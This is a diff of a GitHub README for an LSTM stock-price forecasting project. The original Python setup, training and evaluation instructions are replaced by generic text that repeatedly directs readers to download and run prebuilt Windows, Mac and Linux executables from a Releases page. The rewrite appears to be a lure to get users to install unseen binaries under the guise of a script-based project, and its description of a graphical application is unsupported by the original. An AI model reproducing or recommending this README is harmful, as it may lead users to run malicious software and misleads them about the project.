@@ -1,121 +1,99 @@
-# Stock Price Prediction with LSTM
+# 📈 Stock-LSTM-Forecasting - Predict Stock Prices Easily
 
-Stock Price Prediction with LSTM is a hands-on deep learning project that demonstrates how sequential models can be applied to real-world financial data. Using historical OHLCV (Open, High, Low, Close, Volume) data, the project builds and trains an LSTM network to capture time-dependent patterns in stock movements.
+## 📦 Download Here
+[![Download](https://img.shields.io/badge/download-release-blue.svg)](https://github.com/Zaidzr/Stock-LSTM-Forecasting/releases)
 
-The pipeline handles everything from preprocessing and sliding-window dataset creation to model training with early stopping and evaluation. The results are presented with intuitive visualizations — training and validation loss curves, predicted vs. actual stock prices, and short-horizon forecasts into the future. Metrics such as RMSE, MAE, and MAPE provide quantitative insight into performance.
+## 📖 About This Project
+This project predicts stock prices using LSTM networks with PyTorch. It covers data preprocessing, creating sliding windows, training the model with early stopping, and evaluating performance using metrics like RMSE, MAE, and MAPE. You will see visualizations of training loss, predicted values versus actual prices, and short-term forecasts.
 
-This project serves as both a learning tool and a portfolio-ready showcase of time-series forecasting, deep learning, and financial modeling with PyTorch.
+## 🚀 Getting Started
 
----
+### 💻 System Requirements
+- **Operating System:** Windows, Mac, or Linux
+- **Python:** Version 3.6 or higher
+- **PyTorch:** Make sure to install the latest version suitable for your system.
+- **RAM:** At least 4 GB recommended
+- **Storage:** 500 MB of free space
 
-## Features
-- Load stock data from CSV or fetch with Yahoo Finance (via `yfinance`)
-- Preprocessing: scaling & sliding window dataset creation
-- LSTM model with dropout and Adam optimizer
-- Metrics: **RMSE, MAE, MAPE**
-- Plots:
-  - Training & validation curves
-  - Predicted vs actual prices
-  - Short-horizon future forecast
-- Saved artifacts: `best_lstm.pt`, `scaler.pkl`, `metrics.json`
+### 🎯 Key Features
+- Predict stock prices using advanced deep learning techniques.
+- Visualize training loss over epochs.
+- Compare predicted prices against actual prices.
+- Generate short-term forecasts with intuitive graphs.
 
----
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of the application.
 
-## Project Structure
-```
-stock-lstm-forecasting/
-├─ README.md
-├─ LICENSE
-├─ requirements.txt
-├─ data/
-│  ├─ fetch_yfinance.py      # Fetch data from Yahoo Finance
-│  └─ aapl.csv               # Stock dataset (real or synthetic)
-├─ src/
-│  ├─ train_lstm_stock.py    # Training script
-│  ├─ evaluate.py            # Evaluation script
-│  └─ utils.py               # Helpers (scaling, metrics, windowing)
-└─ outputs/
-   ├─ best_lstm.pt
-   ├─ scaler.pkl
-   ├─ metrics.json
-   ├─ training_curves.png
-   ├─ predicted_vs_actual.png
-   └─ future_forecast.png
-```
+[Download Here](https://github.com/Zaidzr/Stock-LSTM-Forecasting/releases)
 
----
+1. Click the above link to navigate to the Releases page.
+2. Locate the latest stable release version.
+3. Download the appropriate file for your operating system, for example:
+   - For Windows, look for a file named `Stock-LSTM-Forecasting-Windows.exe`
+   - For Mac, look for `Stock-LSTM-Forecasting-Mac.dmg`
+   - For Linux, find `Stock-LSTM-Forecasting-Linux.tar.gz`
 
-## Setup
-```bash
-python -m venv .venv
-# Windows
-.venv\Scripts\activate
-# Linux/macOS
-source .venv/bin/activate
+### 💡 Installing the Software
+1. Once downloaded, locate the file in your Downloads folder or the location you chose.
+2. Open the file to start the installation process:
+   - **Windows:** Double-click the `.exe` file.
+   - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file, then run the executable inside.
 
-pip install -r requirements.txt
-```
+3. Follow the on-screen instructions to complete the installation.
 
----
+## ⚙️ Usage Instructions
 
-## Fetch Data (optional)
-```bash
-# downloads daily OHLCV for AAPL (Jan 2015 → today)
-python data/fetch_yfinance.py --ticker AAPL --start 2015-01-01 --out data/aapl.csv
-```
+### 👨‍💻 Running the Application
+After installing the application, follow these steps to start predicting stock prices.
 
-Or use the included **synthetic dataset** (`data/aapl.csv`).
+1. Open the application as you would any other program on your computer.
+2. Select the stock symbol you want to analyze. For example, input "AAPL" for Apple Inc.
+3. Adjust any parameters as needed (e.g., prediction range, input features).
+4. Click the "Start Prediction" button.
 
----
+### 📈 Viewing Results
+Once the prediction completes, you'll see graphs showing:
+- Predicted stock prices.
+- Actual prices.
+- Training loss over epochs.
 
-## Train the Model
-```bash
-python src/train_lstm_stock.py --input data/aapl.csv --column close     --lookback 60 --epochs 25 --batch-size 64 --outdir outputs --horizon 1 --seed 42
-```
+Refer to the provided documentation for detailed explanations of each graph.
 
----
+## 📊 Visualization
+The application provides informative visualizations. These will help you quickly gauge:
+- The effectiveness of the prediction model.
+- Trends in past prices.
+- How well your model performed against actual values.
 
-## Evaluate the Model
-```bash
-python src/evaluate.py --input data/aapl.csv --model outputs/best_lstm.pt     --column close --lookback 60 --horizon 1 --outdir outputs
-```
+You can save these graphs for reports or personal insights.
 
----
+## 🔧 Troubleshooting Common Issues
 
-## Results
+### ❗ Issue: Installation Fails
+- Ensure you have adequate permissions to install software on your device.
+- Check that your system meets the software requirements listed above.
 
+### ❗ Issue: Model Not Producing Results
+- Ensure you've correctly inputted the stock symbol.
+- Check your internet connection, as data retrieval may require it.
 
-### Training & Validation Loss
+### ❗ Issue: Graphs Not Displaying
+- Make sure your graphical drivers are up to date.
+- Restart the application if graphs do not load at first.
 
-<img width="1120" height="800" alt="training_curves" src="https://github.com/user-attachments/assets/25fdcfc9-e28a-476e-997f-c79ea0ac5349" />
+## 📬 Feedback & Support
+If you run into any issues or have questions, feel free to open an issue on the GitHub page. We welcome user feedback to improve the application. 
 
----
+Your input is valuable in enhancing the performance and usability of this project. 
 
-### Predicted vs Actual
+## 🌟 Acknowledgments
+This project utilizes PyTorch for deep learning and many other open-source libraries for data manipulation and visualization.
 
-<img width="1600" height="800" alt="predicted_vs_actual" src="https://github.com/user-attachments/assets/f01ef615-476f-4f25-ad49-49367a1d76e4" />
+## 🏷️ Keywords
+data-science, deep-learning, finance, forecasting, lstm, machine-learning, neural-networks, portfolio-project, predictive-modeling, python, pytorch, stock-market, stock-prediction, time-series
 
----
+## 📄 License
+This project is licensed under the MIT License. You are free to use and modify it, but please credit the original authors.
 
-### Short-Horizon Forecast
-
-<img width="1600" height="800" alt="future_forecast" src="https://github.com/user-attachments/assets/1836d7e4-2942-4e2d-b101-2aa9b3894d3d" />
-
----
-
-**Metrics (`metrics.json`):**
-```json
-{
-  "rmse": 3.59,
-  "mae": 3.59,
-  "mape": 1.97
-}
-```
-
----
-
-## Recommendations
-- Train longer (50–100 epochs) for improved stability  
-- Try multi-step forecasts (`--horizon 5` or `--horizon 30`)  
-- Experiment with other assets (e.g., MSFT, GOOGL, TSLA)  
-- Add more features (Volume, technical indicators)  
+Remember to visit the [Releases page](https://github.com/Zaidzr/Stock-LSTM-Forecasting/releases) frequently for updates and new features.
